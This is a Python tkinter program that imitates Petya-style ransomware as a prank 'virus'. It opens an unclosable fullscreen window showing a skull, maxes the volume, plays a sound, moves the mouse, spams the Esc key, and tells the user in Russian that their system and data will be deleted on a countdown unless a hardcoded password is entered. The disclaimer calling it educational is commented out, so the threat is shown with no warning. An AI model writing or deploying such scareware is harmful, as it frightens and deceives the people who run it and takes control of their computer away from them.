from tkinter import Tk, Label, Button, Entry
import pyautogui
from threading import Thread
from playsound import playsound
from time import sleep, time_ns
pyautogui.FAILSAFE = False
pyautogui.PAUSE = 0
root = Tk()


def two_digits(n):
    return ('0' * (2 - len(str(n)))) + str(n)


def secs2time(n):
    return f'{two_digits(n // 3600)}:{two_digits((n // 60) - (n // 3600) * 60)}:{two_digits(n % 60)}'


def petya_intro():
    petya.pack()
    bg2 = "red"
    color2 = "white"
    for i in range(10):
        sleep(0.14)
        petya.config(bg=bg2, foreground=color2)
        sleep(0.14)
        petya.config(bg=bg, foreground="red")
    petya.config(text="", font='Arial 0')
    root['bg'] = bg
    return add_elements()


def scare_trojan():
    # time_ns_req = time_ns() + 1_000_000_000 * 10
    # while time_ns() < time_ns_req:
    #     pyautogui.moveTo(w//2, h//2)
    pyautogui.moveTo(0, 0)
    pyautogui.dragTo(w, h, duration = 10, mouseDownUp=False)


def wait_for():
    secs_rem = 7401
    while secs_rem > 0:
        pp.config(text=pass_prompt.replace('%', secs2time(secs_rem)))
        secs_rem -= 1
        sleep(1)


def exit():
    try:
        err_lbl.config(text=exit_err)
    except:
        pass


def check_passwd():
    if password.get() == password_txt:
        global stopped
        stopped = True
        root.destroy()
        exit()
    else:
        err_lbl.config(text=password_err)


def calc_for_this_monitor(n):
    w = root.winfo_screenwidth()
    h = root.winfo_screenheight()
    w_standard, h_standard = 1920, 1080
    k = w / w_standard
    return int(n * k)


def add_elements():
    Label(text=title, fg=title_color, font=title_font, background=bg).pack()  # add title element
    skull_lbl = Label(text=skull_art, fg=title_color, font=f'Consolas {calc_for_this_monitor(9)}', background=bg)  # add skull element
    skull_lbl.pack()
    pp = Label(text=pass_prompt, fg=pp_color, font=pp_font, background=bg)  # add info element
    pp.pack()
    password = Entry(font=pass_font)  # add pass input element
    password.pack()
    Label(text="\n", background=bg, font=err_font).pack()  # add enter element
    Button(text="Ввести пароль", command=check_passwd, font=button_font).pack()  # add btn element
    err_lbl = Label(text="\n\n", fg=pp_color, font=pp_font, background=bg)  # add "wrong pass" element
    err_lbl.pack()
    return skull_lbl, pp, password, err_lbl


def thread_2():
    pyautogui.keyDown('volumeup')
    scare_trojan()
    global skull_lbl, pp, password, err_lbl
    skull_lbl, pp, password, err_lbl = petya_intro()
    wait_for()


def thread_3():
    while True:
        pyautogui.press('esc')
        sleep(0.1)
        if stopped:
            break


password_txt = "12344321"

title = f"Ваш компьютер заблокирован! (Вирус от Тимофея)"
pass_prompt = "Попытки перезагрузки/выключения приведут к удалению системы и всех данных.\nУдаление системы и данных через: %\n\nЧтобы разблокировать,\nвведите пароль:\n"
password_err = "\nПароль неправильный"
exit_err = "\nAlt+F4 тут не поможет."
disclaimer = "\n" * 20 + "Это не вирус и создано в учебных и ознакомительных целях Истоминым Тимофеем. Пароль спросите у него"

title_color = "red"
pp_color = "red"
bg = "black"

title_font = f"Arial {calc_for_this_monitor(50)}"
pp_font = f"Arial {calc_for_this_monitor(25)}"
pass_font = f"Arial {calc_for_this_monitor(10)}"
petya_font = f"Consolas {calc_for_this_monitor(29)}"
button_font = pass_font
err_font = button_font
d_font = f"Arial {calc_for_this_monitor(10)}"
skull_art = '\n             uu$$$$$$$$$$$uu             \n          uu$$$$$$$$$$$$$$$$$uu          \n         u$$$$$$$$$$$$$$$$$$$$$u         \n        u$$$$$$$$$$$$$$$$$$$$$$$u        \n       u$$$$$$$$$$$$$$$$$$$$$$$$$u       \n       u$$$$$$*   *$$$*   *$$$$$$u       \n       *$$$$*      u$u       $$$$*       \n        $$$u       u$u       u$$$        \n        $$$u      u$$$u      u$$$        \n         *$$$$uu$$$   $$$uu$$$$*         \n          *$$$$$$$*   *$$$$$$$*          \n            u$$$$$$$u$$$$$$$u            \n             u$*$*$*$*$*$*$u             \n  uuu        $$u$ $ $ $ $u$$       uuu   \n  u$$$$       $$$$$u$u$u$$$       u$$$$  \n  $$$$$uu      *$$$$$$$$$*     uu$$$$$$  \nu$$$$$$$$$$$uu    *****    uuuu$$$$$$$$$ \n$$$$***$$$$$$$$$$uuu   uu$$$$$$$$$***$$$*\n ***      **$$$$$$$$$$$uu **$***         \n          uuuu **$$$$$$$$$$uuu           \n u$$$uuu$$$$$$$$$uu **$$$$$$$$$$$uuu$$$  \n $$$$$$$$$$****           **$$$$$$$$$$$* \n   *$$$$$*                      **$$$$** \n     $$$*                         $$$$*  \n'
skull_art_long = '                                           uu$$$$$$$$$$$uu                                           \n                                        uu$$$$$$$$$$$$$$$$$uu                                        \n                                       u$$$$$$$$$$$$$$$$$$$$$u                                       \n                                      u$$$$$$$$$$$$$$$$$$$$$$$u                                      \n                                     u$$$$$$$$$$$$$$$$$$$$$$$$$u                                     \n                                     u$$$$$$*   *$$$*   *$$$$$$u                                     \n                                     *$$$$*      u$u       $$$$*                                     \n                                      $$$u       u$u       u$$$                                      \n                                      $$$u      u$$$u      u$$$                                      \n                                       *$$$$uu$$$   $$$uu$$$$*                                       \n                                        *$$$$$$$*   *$$$$$$$*                                        \n                                          u$$$$$$$u$$$$$$$u                                          \n                                           u$*$*$*$*$*$*$u                                           \n                                uuu        $$u$ $ $ $ $u$$       uuu                                 \n                                u$$$$       $$$$$u$u$u$$$       u$$$$                                \n                                $$$$$uu      *$$$$$$$$$*     uu$$$$$$                                \n                              u$$$$$$$$$$$uu    *****    uuuu$$$$$$$$$                               \n                              $$$$***$$$$$$$$$$uuu   uu$$$$$$$$$***$$$*                              \n                               ***      **$$$$$$$$$$$uu **$***                                       \n                                        uuuu **$$$$$$$$$$uuu                                         \n                               u$$$uuu$$$$$$$$$uu **$$$$$$$$$$$uuu$$$                                \n                               $$$$$$$$$$****           **$$$$$$$$$$$*                               \n                                 *$$$$$*                      **$$$$**                               \n                                   $$$*                         $$$$*                                '
w = root.winfo_screenwidth()
h = root.winfo_screenheight()
stopped = False

root["bg"] = bg
root.protocol("WM_DELETE_WINDOW", exit)
root.attributes("-topmost", 1)
root.geometry(f'{w}x{h}')
root.overrideredirect(True)

petya = Label(text=skull_art_long, fg="red", font=petya_font, background=bg)

# Label(text=disclaimer, fg="white", font=d_font, background=bg).pack()
for i in range(100):
    pyautogui.press('volumeup')
wait_thread = Thread(target=thread_2)
wait_thread.start()
song_thread = Thread(target=lambda: playsound('MY3blKA.mp3'))
song_thread.start()
esc_thread = Thread(target=thread_3)
esc_thread.start()
sleep(10)
# skull_lbl, pp, password, err_lbl = add_elements()
root.mainloop()
